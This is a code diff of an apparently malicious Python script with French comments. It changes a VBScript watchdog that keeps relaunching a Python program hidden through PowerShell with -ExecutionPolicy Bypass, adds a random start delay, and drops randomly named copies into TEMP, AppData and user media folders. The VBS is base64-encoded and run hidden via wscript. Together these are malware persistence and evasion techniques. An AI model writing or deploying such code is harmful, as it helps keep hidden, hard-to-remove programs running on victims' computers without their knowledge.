@@ -13,26 +13,23 @@ import time
 import random
 import base64
 
-vbs_template = r'''
-Set WshShell = CreateObject("WScript.Shell")
-Set WMI = GetObject("winmgmts:\\.\root\cimv2")
-
-pythonProcessName = "pythonw.exe"  ' ou python.exe si tu préfères
-scriptPath = "{}"  ' chemin complet vers ton script python
-
+vbs_template = r'''Set WshShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+target = "{script_path}"
+Randomize
+WScript.Sleep (Int((30 * Rnd) + 5) * 1000) ' Sleep initial aléatoire entre 5 et 15 secondes
 Do
-    procCount = 0
-    Set processes = WMI.ExecQuery("Select * from Win32_Process Where Name='" & pythonProcessName & "'")
-    For Each process In processes
-        If InStr(LCase(process.CommandLine), LCase(scriptPath)) > 0 Then
-            procCount = procCount + 1
+    found = False
+    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name='python.exe' or Name='pythonw.exe'")
+    For Each objProcess in colProcessList
+        If InStr(LCase(objProcess.CommandLine), LCase(target)) > 0 Then
+            found = True
+            Exit For
         End If
     Next
-
-    If procCount = 0 Then
-        WshShell.Run "pythonw.exe """ & scriptPath & """", 0, False
+    If Not found Then
+        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
     End If
-
     WScript.Sleep 5000
 Loop
 '''
@@ -68,7 +65,9 @@ target_dirs = [
     os.getenv("TEMP"),
     os.getenv("APPDATA"),
     os.path.expandvars(r"%USERPROFILE%\Documents"),
-    os.path.expandvars(r"%USERPROFILE%\Desktop"),
+    os.path.expandvars(r"%USERPROFILE%\Download"),
+    os.path.expandvars(r"%USERPROFILE%\Image"),
+    os.path.expandvars(r"%USERPROFILE%\Video"),
 ]
 
 def deleteVbsFileAfterFinish():
@@ -85,10 +84,21 @@ def deleteVbsFileAfterFinish():
 def create_watchdog_vbs(script_python_path, target_dirs):
     script_final = vbs_template.format(script_python_path.replace("\\", "\\\\"))
     b64_vbs = base64.b64encode(script_final.encode()).decode()
+
     for folder in target_dirs:
         try:
             if not os.path.exists(folder):
                 os.makedirs(folder)
+                
+            
+            existing_vbs = [
+                f for f in os.listdir(folder)
+                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog_')
+            ]
+
+            if existing_vbs:
+                print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
+                continue
 
             random_name = f"watchdog_{secrets.token_hex(4)}.vbs"
             vbs_path = os.path.join(folder, random_name)
@@ -98,11 +108,11 @@ def create_watchdog_vbs(script_python_path, target_dirs):
 
             #mettre vbs en memoire avec base64 
             powershell_command = (
-                f'powershell -ExecutionPolicy Bypass -NoProfile -Command '
+                f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
                 f'"$b64 = \'{b64_vbs}\'; '
                 f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
                 f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
-                f'Start-Process wscript.exe \'{escaped_vbs_path}\'"'
+                f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
             )
             subprocess.Popen(powershell_command, shell=True)
             #with open(vbs_path, "w", encoding="utf-8") as f:
